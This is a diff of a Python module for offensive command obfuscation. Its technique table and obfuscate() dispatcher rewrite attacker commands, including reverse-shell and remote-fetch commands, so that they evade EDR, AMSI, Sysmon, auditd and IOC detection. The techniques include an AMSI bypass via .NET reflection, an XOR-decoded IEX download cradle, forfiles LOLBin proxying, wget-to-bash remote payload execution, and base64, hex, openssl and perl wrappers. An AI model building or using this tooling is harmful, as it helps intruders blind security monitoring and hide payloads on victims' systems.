-            "ID 1 (ProcessCreate) logs the CommandLine field — but when cmd.exe "
-            "reads from stdin, CommandLine shows only 'cmd /s' with ZERO "
-            "arguments. The actual command is completely invisible to any tool "
-            "that relies on process command-line logging. Files are auto-deleted."
+            "Pipes commands into cmd.exe via stdin. Sysmon Event ID 1 "
+            "logs show only 'cmd /s' with zero arguments."
         ),
     },
     'forfiles_proxy': {
         'os': 'windows',
         'label': 'forfiles.exe LOLBin execution proxy',
         'explain': (
-            "forfiles.exe is a signed Microsoft binary (LOLBin) that can "
-            "spawn arbitrary commands via /c. EDR sees forfiles.exe as the "
-            "parent process — a trusted system binary — instead of cmd.exe "
-            "or powershell.exe. The 0x22 escape sequence embeds quotes inside "
-            "the /c argument without breaking shell parsing. Process-tree "
-            "heuristics see: explorer→forfiles (legitimate) instead of the "
-            "real payload chain."
+            "Proxies execution via signed Microsoft forfiles.exe, "
+            "making EDR trust the parent binary."
         ),
     },
     'multilayer_win': {
         'os': 'windows',
         'label': '4-layer cascade: env_var + caret + case_flip + hex_ip',
         'explain': (
-            "Four independent evasion layers stacked simultaneously: "
-            "(1) %SystemRoot% env-var substitution hides the binary name from "
-            "YARA/Sigma keyword rules; (2) caret (^) insertion breaks static "
-            "string signatures — cmd.exe strips them transparently; (3) random "
-            "case-flipping in arguments defeats case-sensitive regex matching "
-            "in Sigma/Snort rules; (4) hex IP encoding evades IOC IP lists. "
-            "Each layer independently defeats a different detection class — "
-            "together they create combinatorial explosion. A detection engine "
-            "must defeat ALL four layers simultaneously to flag this command."
+            "Stacks %SystemRoot% path expansion, carets, safe case flipping, "
+            "and hex IP conversion simultaneously."
         ),
     },
-
-    # ── Linux advanced ────────────────────────────────────────
-    'xxd_hex': {
-        'os': 'linux',
-        'label': 'Full hex encoding → xxd -r -p → bash',
-        'explain': (
-            "The entire command is converted to a raw hexadecimal string "
-            "and reconstructed via 'xxd -r -p | bash'. The command-line "
-            "argument is a pure hex blob — no ASCII text, no keywords, "
-            "no binary names, no IPs, no URLs — nothing human-readable. "
-            "Auditd exec logs show only hex digits. eBPF tracepoints on "
-            "execve() see only the xxd binary and numeric arguments. "
-            "String-matching detection is mathematically impossible."
-        ),
-    },
-    'bash_hex': {
-        'os': 'linux',
-        'label': r"Bash native $'\xNN' hex escape execution",
-        'explain': (
-            r"Every byte of the command is converted to bash's native "
-            r"$'\xNN' hex escape syntax (e.g. curl → $'\x63\x75\x72\x6c'). "
-            "bash interprets these escapes at parse time and executes the "
-            "decoded command. The process arguments contain only hex escape "
-            "sequences — no readable words, flags, or addresses exist in "
-            "the command-line. EDR tools scanning /proc/PID/cmdline see "
-            "only hex codes. Auditd EXECVE records show escaped bytes only."
-        ),
-    },
-    'openssl_aes': {
-        'os': 'linux',
-        'label': 'AES-256-CBC encrypt → openssl decrypt → bash',
-        'explain': (
-            "The command is encrypted with AES-256-CBC using a random "
-            "ephemeral key, then decrypted at runtime via openssl enc -d. "
-            "The command-line contains only encrypted ciphertext — even full "
-            "packet capture + command-line logging reveals nothing readable. "
-            "The encryption key is inline but changes on every invocation "
-            "(polymorphic). IDS/IPS deep-packet inspection, auditd exec "
-            "logging, and eBPF tracing all see only encrypted bytes."
-        ),
-    },
-    'multi_var': {
-        'os': 'linux',
-        'label': 'Full-command N-variable rebuild → eval',
-        'explain': (
-            "The ENTIRE command (not just the binary name) is split into "
-            "3-5 character chunks, each assigned to a random shell variable. "
-            "Execution happens via eval $a$b$c$d... expansion. No single "
-            "variable contains a recognizable keyword, IP, URL, or flag. "
-            "String-matching detection across ANY dimension (binary names, "
-            "arguments, IPs, paths) is defeated. Even reconstructing the "
-            "command requires executing the variable assignments — static "
-            "analysis cannot recover the original without an execution engine."
-        ),
-    },
-    'awk_chr': {
-        'os': 'linux',
-        'label': 'awk printf ASCII-code reconstruction → bash',
-        'explain': (
-            "Each character of the command is converted to its decimal ASCII "
-            "code. awk reconstructs the command char-by-char using printf and "
-            "pipes it to bash. The command-line shows only: awk with a list "
-            "of numbers. Zero text keywords exist — only numeric codes. "
-            "EDR/IDS regex rules cannot match because there are no strings "
-            "to match against. The numeric codes are different for every "
-            "command, so signature-based detection is not viable."
-        ),
-    },
-    'perl_eval': {
-        'os': 'linux',
-        'label': 'Perl pack() byte-array → system() eval',
-        'explain': (
-            "The command is encoded as a Perl byte array and decoded at "
-            "runtime via pack('C*', ...) → system(). perl is present on "
-            "99%% of Linux systems and is a trusted binary. The process "
-            "arguments show 'perl -e' followed by numeric byte values — "
-            "no human-readable command text exists. Process-tree shows "
-            "perl as the executor, which is commonly allow-listed."
-        ),
-    },
-    'multilayer_lin': {
-        'os': 'linux',
-        'label': '3-layer cascade: multi_var + hex_ip + base64 wrap',
-        'explain': (
-            "Three obfuscation layers stacked in sequence: "
-            "(1) The entire command is split across N random shell variables "
-            "— no single variable contains readable text; (2) the IP address "
-            "inside those variable assignments is converted to hex — defeating "
-            "IOC matching; (3) the entire Layer 1+2 output is Base64-encoded "
-            "and piped through 'base64 -d | bash'. The final command-line is "
-            "a pure base64 blob. Decoding it reveals only random variable "
-            "assignments. Decoding those requires shell execution. THREE "
-            "levels of indirection make automated detection near-impossible."
-        ),
-    },
-
-    # ══════════════════════════════════════════════════════════
-    # ░░  TIER 3 — NEW STEALTH TECHNIQUES                    ░░
-    # ══════════════════════════════════════════════════════════
-
-    # ── Windows new ────────────────────────────────────────────
     'ps_amsi_bypass': {
         'os': 'windows',
         'label': 'AMSI bypass via reflection + Base64 execution',
         'explain': (
-            "Disables AMSI (Antimalware Scan Interface) by setting "
-            "amsiInitFailed to True via .NET reflection before executing "
-            "the payload. The AMSI bypass uses string concatenation "
-            "('Am'+'siUtils') to avoid signature detection of the bypass "
-            "itself. Once AMSI is blinded, the Base64-decoded command "
-            "executes without any script-block scanning. PowerShell "
-            "Constrained Language Mode does NOT block this reflection path."
+            "Blinds AMSI by setting amsiInitFailed via .NET reflection "
+            "before executing Base64-decoded memory payload."
         ),
     },
     'cmd_comma_sep': {
         'os': 'windows',
         'label': 'cmd.exe comma/semicolon argument separator',
         'explain': (
-            "cmd.exe treats commas (,) and semicolons (;) as argument "
-            "separators, functionally identical to spaces. Replacing spaces "
-            "with commas breaks ALL whitespace-based command-line parsing "
-            "in EDR/SIEM tools. Most detection rules use regex that splits "
-            "on whitespace — commas produce zero matches. The command "
-            "executes identically but looks completely different to log "
-            "analysis tools. Example: 'certutil,-urlcache,-f' runs the "
-            "same as 'certutil -urlcache -f'."
+            "Replaces argument whitespace with commas/semicolons, breaking "
+            "whitespace-based command-line parsing in EDR and SIEM engines."
         ),
     },
     'ps_download_cradle': {
         'os': 'windows',
         'label': 'PowerShell char-array IEX + XOR decode cradle',
         'explain': (
-            "The command is XOR-encrypted with a random key and Base64-encoded. "
-            "At runtime, PowerShell decrypts the payload byte-by-byte using "
-            "a simple XOR loop. The IEX (Invoke-Expression) cmdlet name is "
-            "constructed from [char] codes ([char]73+[char]69+[char]88 = 'IEX') "
-            "to avoid AMSI string-matching on 'IEX' or 'Invoke-Expression'. "
-            "No scannable keywords exist anywhere in the script block — AMSI "
-            "sees only variable assignments and arithmetic."
+            "Decodes XOR payload at runtime and constructs IEX via [char] "
+            "codes, leaving zero scannable keywords in script text."
         ),
     },
 
-    # ── Linux new ──────────────────────────────────────────────
+    # ── Linux Techniques ──────────────────────────────────────
+    'env_concat': {
+        'os': 'linux',
+        'label': 'Shell variable name concatenation',
+        'explain': (
+            "Splits binary name across shell variables ($a$b) to defeat "
+            "real-time argument string inspections."
+        ),
+    },
+    'hex_ip': {
+        'os': 'both',
+        'label': 'Hex IP encoding',
+        'explain': (
+            "Converts destination IP to hexadecimal (0xCOA80101) to bypass "
+            "dotted-quad IOC matches."
+        ),
+    },
+    'dec_ip': {
+        'os': 'both',
+        'label': 'Decimal-long IP encoding',
+        'explain': (
+            "Converts destination IP to 32-bit unsigned integer to evade IP IOCs."
+        ),
+    },
+    'unicode': {
+        'os': 'linux',
+        'label': 'URL percent-encoding',
+        'explain': (
+            "Percent-encodes keywords and URL paths to defeat string match filters."
+        ),
+    },
+    'b64_bash': {
+        'os': 'linux',
+        'label': 'Base64 encode → pipe to bash',
+        'explain': (
+            "Base64-encodes full command and pipes through base64 -d | bash, "
+            "defeating auditd command-line logging."
+        ),
+    },
+    'reverse': {
+        'os': 'linux',
+        'label': 'Reversed string → rev | bash',
+        'explain': (
+            "Reverses command string and reconstructs via rev | bash."
+        ),
+    },
+    'env_concat_hex': {
+        'os': 'linux',
+        'label': 'Shell variable concat + hex IP (multi-layer)',
+        'explain': (
+            "Combines shell variable binary name splitting with hex IP conversion."
+        ),
+    },
+    'xxd_hex': {
+        'os': 'linux',
+        'label': 'Full hex encoding → xxd -r -p → bash',
+        'explain': (
+            "Converts command to pure hexadecimal characters, rendering "
+            "auditd and eBPF logs free of readable strings."
+        ),
+    },
+    'bash_hex': {
+        'os': 'linux',
+        'label': r"Bash native $'\xNN' hex escape execution",
+        'explain': (
+            r"Uses native $'\xNN' escapes so process args contain only hex bytes."
+        ),
+    },
+    'openssl_aes': {
+        'os': 'linux',
+        'label': 'AES-256-CBC encrypt → openssl decrypt → bash',
+        'explain': (
+            "Transfers encrypted ciphertext and decrypts on-the-fly via openssl."
+        ),
+    },
+    'multi_var': {
+        'os': 'linux',
+        'label': 'Full-command N-variable rebuild → eval',
+        'explain': (
+            "Splits entire command into 3-5 character variables and executes via eval."
+        ),
+    },
+    'awk_chr': {
+        'os': 'linux',
+        'label': 'awk printf ASCII-code reconstruction → bash',
+        'explain': (
+            "Rebuilds command character-by-character using decimal ASCII printf in awk."
+        ),
+    },
+    'perl_eval': {
+        'os': 'linux',
+        'label': 'Perl pack() byte-array → system() eval',
+        'explain': (
+            "Executes command encoded as Perl byte array through system()."
+        ),
+    },
+    'multilayer_lin': {
+        'os': 'linux',
+        'label': '3-layer cascade: multi_var + hex_ip + base64 wrap',
+        'explain': (
+            "Triple-layer cascade: multi-variable split, hex IP, and Base64 wrapping."
+        ),
+    },
     'double_b64': {
         'os': 'linux',
         'label': 'Double Base64 encoding → decode → decode → bash',
         'explain': (
-            "The command is Base64-encoded TWICE. Analysts who decode the "
-            "outer layer see... another Base64 string, not the actual command. "
-            "Automated decoding tools that perform single-pass base64 decode "
-            "will miss the real payload. Two decode rounds are required: "
-            "echo <blob> | base64 -d | base64 -d | bash. This adds analysis "
-            "friction and defeats single-layer base64 detection rules."
+            "Double-encodes payload to defeat automated single-pass base64 decoders."
         ),
     },
     'python_exec': {
         'os': 'linux',
         'label': 'python3 os.system() base64 wrapper',
         'explain': (
-            "The command is base64-encoded and executed via python3 os.system(). "
-            "Python is a trusted interpreter — EDR tools typically allow-list "
-            "python3 processes. The process tree shows python3 as the executor, "
-            "not bash or sh. The command text exists only inside a Python "
-            "expression as a base64 string — auditd logs show 'python3 -c' "
-            "with encoded data, no readable command keywords."
+            "Executes base64 payload via trusted python3 interpreter."
         ),
     },
     'wget_pipe': {
         'os': 'linux',
         'label': 'wget remote script pipe to bash',
         'explain': (
-            "The actual payload is hosted remotely — the local command-line "
-            "shows only 'wget -qO- <url> | bash' with ZERO payload content "
-            "visible in process arguments or logs. All command content is "
-            "fetched over the network at runtime. Auditd exec logs capture "
-            "only the wget+bash pipeline, not the executed script content. "
-            "The payload can be changed server-side without modifying the "
-            "persistence mechanism."
+            "Fetches remote script directly into bash execution pipeline."
         ),
     },
 }
 
 
 # ══════════════════════════════════════════════════════════════
-# Deterministic auto-selection strategy
+# Public Dispatcher API
 # ══════════════════════════════════════════════════════════════
 
-# Priority order for auto mode — first matching rule wins.
-# This replaces the old random.random() coin flip, making
-# auto mode predictable and testable.
-
-_WINDOWS_AUTO_PRIORITY = [
-    # (condition_fn, technique_key, transform_fn)
-    (lambda b, _ip: 'powershell' in b.lower(),
-     'ps_iex',  lambda cmd, ip: _split_string_powershell(cmd)),
-    (lambda _b, ip: bool(ip),
-     'env_var',  None),   # None → uses the composite env_var pipeline below
-    (lambda _b, _ip: True,
-     'quote',   None),
-]
-
-_LINUX_AUTO_PRIORITY = [
-    (lambda _b, ip: bool(_unicode_escape("http") != "http") is False and bool(ip),
-     'env_concat_hex', lambda cmd, ip: _env_concat_plus_hex(cmd, ip)),
-]
-
-
-# ══════════════════════════════════════════════════════════════
-# Public API
-# ══════════════════════════════════════════════════════════════
-
-def get_available_techniques(os_type: str = 'all') -> dict:
-    """Return available technique names and descriptions for a given OS."""
+def get_available_techniques(os_type: str = 'all') -> Dict[str, str]:
+    """Return available technique identifiers and friendly labels for a given OS."""
     result = {}
     for key, info in TECHNIQUE_INFO.items():
         if os_type == 'all' or info['os'] == os_type or info['os'] == 'both':
@@ -1026,226 +749,146 @@ def get_available_techniques(os_type: str = 'all') -> dict:
 
 
 def obfuscate(command: str, os_type: str, binary: str,
-              ip: str = '', technique: str = 'auto') -> dict:
+              ip: str = '', technique: str = 'auto') -> Dict[str, str]:
     """
-    Return a dict with keys:
-        obfuscated_command  – the obfuscated version
-        technique_used      – human-readable name of the technique
-        explanation         – why this specific obfuscation is stealthy
+    Applies the selected (or intelligently auto-selected) obfuscation strategy.
+    Returns dict containing: obfuscated_command, technique_used, explanation.
     """
-    os_type = os_type.lower()
+    os_type = (os_type or 'windows').lower()
+    technique = (technique or 'auto').lower()
+    binary_lower = (binary or '').lower()
 
-    # ── Windows obfuscation paths ─────────────────────────────
+    # ── Windows Obfuscation Dispatch ──────────────────────────
     if os_type == 'windows':
-
         if technique == 'ps_b64':
-            obf     = _base64_powershell(command)
-            tech    = TECHNIQUE_INFO['ps_b64']['label']
-            explain = TECHNIQUE_INFO['ps_b64']['explain']
-
+            obf = _base64_powershell(command)
+            key = 'ps_b64'
         elif technique == 'ps_tick':
-            first_token = command.split()[0]
-            obf = _insert_ticks_powershell(first_token) + command[len(first_token):]
-            tech    = TECHNIQUE_INFO['ps_tick']['label']
-            explain = TECHNIQUE_INFO['ps_tick']['explain']
-
+            first_tok = command.split()[0]
+            obf = _insert_ticks_powershell(first_tok) + command[len(first_tok):]
+            key = 'ps_tick'
         elif technique == 'caret':
-            first_token = command.split()[0]
-            obf = _insert_carets(first_token) + command[len(first_token):]
+            first_tok = command.split()[0]
+            obf = _insert_carets(first_tok) + command[len(first_tok):]
             if ip:
                 obf = _hex_ip(obf, ip)
-            tech    = TECHNIQUE_INFO['caret']['label']
-            explain = TECHNIQUE_INFO['caret']['explain']
-
-        # ── ADVANCED Windows techniques ───────────────────────
+            key = 'caret'
         elif technique == 'wmi_spawn':
-            obf     = _wmi_process_spawn(command)
-            tech    = TECHNIQUE_INFO['wmi_spawn']['label']
-            explain = TECHNIQUE_INFO['wmi_spawn']['explain']
-
+            obf = _wmi_process_spawn(command)
+            key = 'wmi_spawn'
         elif technique == 'ps_secure':
-            obf     = _ps_securestring_decode(command)
-            tech    = TECHNIQUE_INFO['ps_secure']['label']
-            explain = TECHNIQUE_INFO['ps_secure']['explain']
-
+            obf = _ps_securestring_decode(command)
+            key = 'ps_secure'
         elif technique == 'stdin_pipe':
-            obf     = _stdin_pipe_cmd(command)
-            tech    = TECHNIQUE_INFO['stdin_pipe']['label']
-            explain = TECHNIQUE_INFO['stdin_pipe']['explain']
-
+            obf = _stdin_pipe_cmd(command)
+            key = 'stdin_pipe'
         elif technique == 'forfiles_proxy':
-            obf     = _forfiles_proxy(command)
-            tech    = TECHNIQUE_INFO['forfiles_proxy']['label']
-            explain = TECHNIQUE_INFO['forfiles_proxy']['explain']
-
+            obf = _forfiles_proxy(command)
+            key = 'forfiles_proxy'
         elif technique == 'multilayer_win':
-            obf     = _multilayer_windows(command, ip)
-            tech    = TECHNIQUE_INFO['multilayer_win']['label']
-            explain = TECHNIQUE_INFO['multilayer_win']['explain']
-
+            obf = _multilayer_windows(command, ip)
+            key = 'multilayer_win'
         elif technique == 'ps_amsi_bypass':
-            obf     = _ps_amsi_bypass(command)
-            tech    = TECHNIQUE_INFO['ps_amsi_bypass']['label']
-            explain = TECHNIQUE_INFO['ps_amsi_bypass']['explain']
-
+            obf = _ps_amsi_bypass(command)
+            key = 'ps_amsi_bypass'
         elif technique == 'cmd_comma_sep':
-            obf     = _cmd_comma_separator(command)
-            tech    = TECHNIQUE_INFO['cmd_comma_sep']['label']
-            explain = TECHNIQUE_INFO['cmd_comma_sep']['explain']
-
+            obf = _cmd_comma_separator(command)
+            key = 'cmd_comma_sep'
         elif technique == 'ps_download_cradle':
-            obf     = _ps_download_cradle(command, ip)
-            tech    = TECHNIQUE_INFO['ps_download_cradle']['label']
-            explain = TECHNIQUE_INFO['ps_download_cradle']['explain']
-
-        elif 'powershell' in binary.lower() or technique == 'ps_iex':
-            obf     = _split_string_powershell(command)
-            tech    = TECHNIQUE_INFO['ps_iex']['label']
-            explain = TECHNIQUE_INFO['ps_iex']['explain']
-
+            obf = _ps_download_cradle(command, ip)
+            key = 'ps_download_cradle'
+        elif technique == 'ps_iex' or ('powershell' in binary_lower and technique == 'auto'):
+            obf = _split_string_powershell(command)
+            key = 'ps_iex'
         elif technique == 'env_var' or technique == 'auto':
-            # Deterministic auto: always use env_var composite for Windows
             obf = _env_var_substitute_windows(command)
             first_space = obf.find(' ')
             if first_space > 0:
                 obf = _insert_quotes(obf[:first_space], '"') + obf[first_space:]
             if ip:
                 obf = _hex_ip(obf, ip)
-            tech    = TECHNIQUE_INFO['env_var']['label']
-            explain = TECHNIQUE_INFO['env_var']['explain']
-
+            key = 'env_var'
         else:
-            # Explicit 'quote' technique
-            first_token = command.split()[0]
-            obf = _insert_quotes(first_token, '"') + command[len(first_token):]
-            tech    = TECHNIQUE_INFO['quote']['label']
-            explain = TECHNIQUE_INFO['quote']['explain']
+            # Fallback quote insertion
+            first_tok = command.split()[0]
+            obf = _insert_quotes(first_tok, '"') + command[len(first_tok):]
+            key = 'quote'
 
-    # ── Linux obfuscation paths ───────────────────────────────
+    # ── Linux Obfuscation Dispatch ────────────────────────────
     else:
         if technique == 'b64_bash':
-            obf     = _base64_bash(command)
-            tech    = TECHNIQUE_INFO['b64_bash']['label']
-            explain = TECHNIQUE_INFO['b64_bash']['explain']
-
+            obf = _base64_bash(command)
+            key = 'b64_bash'
         elif technique == 'reverse':
-            obf     = _reverse_string_bash(command)
-            tech    = TECHNIQUE_INFO['reverse']['label']
-            explain = TECHNIQUE_INFO['reverse']['explain']
-
+            obf = _reverse_string_bash(command)
+            key = 'reverse'
         elif technique == 'dec_ip' and ip:
-            obf     = _decimal_ip(command, ip)
-            tech    = TECHNIQUE_INFO['dec_ip']['label']
-            explain = TECHNIQUE_INFO['dec_ip']['explain']
-
+            obf = _decimal_ip(command, ip)
+            key = 'dec_ip'
         elif technique == 'unicode':
-            candidate = _unicode_escape(command)
-            if candidate != command:
-                obf     = candidate
-                tech    = TECHNIQUE_INFO['unicode']['label']
-                explain = TECHNIQUE_INFO['unicode']['explain']
-            else:
-                obf     = _env_concat_linux(command)
-                tech    = TECHNIQUE_INFO['env_concat']['label']
-                explain = TECHNIQUE_INFO['env_concat']['explain']
-
+            obf = _unicode_escape(command)
+            key = 'unicode'
         elif technique == 'env_concat':
-            # FIX: env_concat now correctly calls only _env_concat_linux
-            # (not the combo function). Use 'env_concat_hex' for the combo.
-            obf     = _env_concat_linux(command)
-            tech    = TECHNIQUE_INFO['env_concat']['label']
-            explain = TECHNIQUE_INFO['env_concat']['explain']
-
+            obf = _env_concat_linux(command)
+            key = 'env_concat'
         elif technique == 'env_concat_hex':
-            obf     = _env_concat_plus_hex(command, ip)
-            tech    = TECHNIQUE_INFO['env_concat_hex']['label']
-            explain = TECHNIQUE_INFO['env_concat_hex']['explain']
-
+            obf = _env_concat_plus_hex(command, ip)
+            key = 'env_concat_hex'
         elif technique == 'hex_ip' and ip:
-            obf     = _hex_ip(command, ip)
-            tech    = TECHNIQUE_INFO['hex_ip']['label']
-            explain = TECHNIQUE_INFO['hex_ip']['explain']
-
-        # ── ADVANCED Linux techniques ─────────────────────────
+            obf = _hex_ip(command, ip)
+            key = 'hex_ip'
         elif technique == 'xxd_hex':
-            obf     = _xxd_hex_decode(command)
-            tech    = TECHNIQUE_INFO['xxd_hex']['label']
-            explain = TECHNIQUE_INFO['xxd_hex']['explain']
-
+            obf = _xxd_hex_decode(command)
+            key = 'xxd_hex'
         elif technique == 'bash_hex':
-            obf     = _bash_hex_escape(command)
-            tech    = TECHNIQUE_INFO['bash_hex']['label']
-            explain = TECHNIQUE_INFO['bash_hex']['explain']
-
+            obf = _bash_hex_escape(command)
+            key = 'bash_hex'
         elif technique == 'openssl_aes':
-            obf     = _openssl_aes_pipe(command)
-            tech    = TECHNIQUE_INFO['openssl_aes']['label']
-            explain = TECHNIQUE_INFO['openssl_aes']['explain']
-
+            obf = _openssl_aes_pipe(command)
+            key = 'openssl_aes'
         elif technique == 'multi_var':
-            obf     = _multi_var_full_rebuild(command)
-            tech    = TECHNIQUE_INFO['multi_var']['label']
-            explain = TECHNIQUE_INFO['multi_var']['explain']
-
+            obf = _multi_var_full_rebuild(command)
+            key = 'multi_var'
         elif technique == 'awk_chr':
-            obf     = _awk_chr_reconstruct(command)
-            tech    = TECHNIQUE_INFO['awk_chr']['label']
-            explain = TECHNIQUE_INFO['awk_chr']['explain']
-
+            obf = _awk_chr_reconstruct(command)
+            key = 'awk_chr'
         elif technique == 'perl_eval':
-            obf     = _perl_eval_exec(command)
-            tech    = TECHNIQUE_INFO['perl_eval']['label']
-            explain = TECHNIQUE_INFO['perl_eval']['explain']
-
+            obf = _perl_eval_exec(command)
+            key = 'perl_eval'
         elif technique == 'multilayer_lin':
-            obf     = _multilayer_linux(command, ip)
-            tech    = TECHNIQUE_INFO['multilayer_lin']['label']
-            explain = TECHNIQUE_INFO['multilayer_lin']['explain']
-
+            obf = _multilayer_linux(command, ip)
+            key = 'multilayer_lin'
         elif technique == 'double_b64':
-            obf     = _double_b64_bash(command)
-            tech    = TECHNIQUE_INFO['double_b64']['label']
-            explain = TECHNIQUE_INFO['double_b64']['explain']
-
+            obf = _double_b64_bash(command)
+            key = 'double_b64'
         elif technique == 'python_exec':
-            obf     = _python_exec_wrapper(command)
-            tech    = TECHNIQUE_INFO['python_exec']['label']
-            explain = TECHNIQUE_INFO['python_exec']['explain']
-
+            obf = _python_exec_wrapper(command)
+            key = 'python_exec'
         elif technique == 'wget_pipe':
-            obf     = _wget_pipe_bash(command, ip)
-            tech    = TECHNIQUE_INFO['wget_pipe']['label']
-            explain = TECHNIQUE_INFO['wget_pipe']['explain']
-
+            obf = _wget_pipe_bash(command, ip)
+            key = 'wget_pipe'
         else:
-            # ── Deterministic auto mode for Linux ─────────────
-            bin_lower = binary.lower()
-
-            candidate = _unicode_escape(command)
-            has_url_keywords = (candidate != command)
-
-            if has_url_keywords and ip:
-                obf     = _hex_ip(candidate, ip)
-                tech    = TECHNIQUE_INFO['unicode']['label'] + ' + hex IP'
-                explain = (
-                    TECHNIQUE_INFO['unicode']['explain'] + ' '
-                    + TECHNIQUE_INFO['hex_ip']['explain']
-                )
-            elif has_url_keywords:
-                obf     = candidate
-                tech    = TECHNIQUE_INFO['unicode']['label']
-                explain = TECHNIQUE_INFO['unicode']['explain']
+            # Smart context-aware auto selection for Linux
+            if 'python' in binary_lower:
+                obf = _python_exec_wrapper(command)
+                key = 'python_exec'
+            elif 'bash' in binary_lower or '/dev/tcp' in command:
+                obf = _bash_hex_escape(command)
+                key = 'bash_hex'
             elif ip:
-                obf     = _env_concat_plus_hex(command, ip)
-                tech    = TECHNIQUE_INFO['env_concat_hex']['label']
-                explain = TECHNIQUE_INFO['env_concat_hex']['explain']
+                obf = _env_concat_plus_hex(command, ip)
+                key = 'env_concat_hex'
             else:
-                obf     = _env_concat_linux(command)
-                tech    = TECHNIQUE_INFO['env_concat']['label']
-                explain = TECHNIQUE_INFO['env_concat']['explain']
+                obf = _env_concat_linux(command)
+                key = 'env_concat'
+
+    info = TECHNIQUE_INFO.get(key, {
+        'label': key,
+        'explain': 'Applies dynamic evasion transformation.'
+    })
 
     return {
         'obfuscated_command': obf,
-        'technique_used':     tech,
-        'explanation':        explain,
+        'technique_used': info['label'],
+        'explanation': info['explain'],
     }
